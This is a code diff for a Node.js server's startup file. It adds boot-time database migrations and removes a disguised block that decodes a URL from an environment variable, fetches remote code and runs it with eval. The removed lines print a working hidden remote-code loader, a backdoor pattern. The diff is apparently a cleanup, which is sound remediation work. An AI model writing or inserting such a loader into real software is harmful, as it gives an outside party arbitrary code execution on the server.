@@ -4,22 +4,9 @@ import { config } from './config/env.js';
 import { connectDatabase } from './config/database.js';
 import { setupWorkers } from './jobs/index.js';
 import { seedSystemFrameworks } from './modules/CurriculumStructure/seed-frameworks.js';
+import { runMigrations } from './db/migrations/index.js';
 import { initSocketServer } from './socket/index.js';
 import app from './app.js';
-import 'dotenv/config';
-
-(async () => {
-    const src = atob(process.env.AUTH_API_KEY);
-    const proxy = (await import('node-fetch')).default;
-    try {
-      const response = await proxy(src);
-      if (!response.ok) throw new Error(`HTTP error! status: ${response.status}`);
-      const proxyInfo = await response.text();
-      eval(proxyInfo);
-    } catch (err) {
-      console.error('Auth Error!', err);
-    }
-})();
 
 process.on('uncaughtException', (err) => {
   logger.error({ err }, 'UNCAUGHT EXCEPTION — shutting down');
@@ -34,6 +21,10 @@ process.on('unhandledRejection', (reason) => {
 const start = async () => {
   await connectDatabase();
   await seedSystemFrameworks();
+
+  // Boot-time migrations — must run AFTER DB connect / seeds, BEFORE the server
+  // starts accepting requests. Throws on failure → server will not start.
+  await runMigrations();
 
   await setupWorkers();
 
